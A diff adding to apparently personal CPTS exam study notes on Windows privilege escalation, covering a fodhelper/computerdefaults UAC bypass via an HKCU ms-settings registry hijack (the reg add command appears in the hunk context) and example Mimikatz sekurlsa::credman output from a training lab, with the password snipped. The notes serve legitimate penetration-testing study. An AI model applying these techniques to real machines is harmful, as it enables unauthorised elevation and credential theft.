@@ -355,7 +355,47 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 > [!important]  
 > `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
 
+### 🧠 Important Verification
 
+Running:
+
+```cmd
+whoami
+```
+
+may still return:
+
+```text
+mcharles
+```
+
+This is because the **username itself does not change**. The important difference is the **integrity/elevation level** of the process.
+
+```text
+mcharles
+   │
+   └── UAC bypass
+          ↓
+   Elevated Administrator context
+          ↓
+   Access to protected locations
+```
+
+> [!warning]  
+> **`whoami` alone is not sufficient to prove that UAC bypass succeeded.** Verify the process's elevation/integrity level and whether you can access Administrator-protected resources.
+
+### 🎯 CPTS Memory
+
+```text
+UAC Bypass
+   ↓
+Modify HKCU\Software\Classes\ms-settings
+   ↓
+Launch fodhelper.exe / computerdefaults.exe
+   ↓
+Elevated command execution
+   ↓
+Administrator-level access
 ```
 # 🔓 11. Mimikatz `sekurlsa::credman`
 
@@ -378,7 +418,22 @@ Next, use:
 mimikatz # sekurlsa::credman
 ```
 
+### 📌 Example Output
 
+```text
+Authentication Id : 0 ; 630472 (00000000:00099ec8)
+Session           : RemoteInteractive from 3
+User Name         : mcharles
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 4/27/2025 2:40:32 AM
+SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
+        credman :
+         [00000000]
+         * Username : mcharles@inlanefreight.local
+         * Domain   : onedrive.live.com
+         * Password : ...SNIP...
+```
 
 ---
 
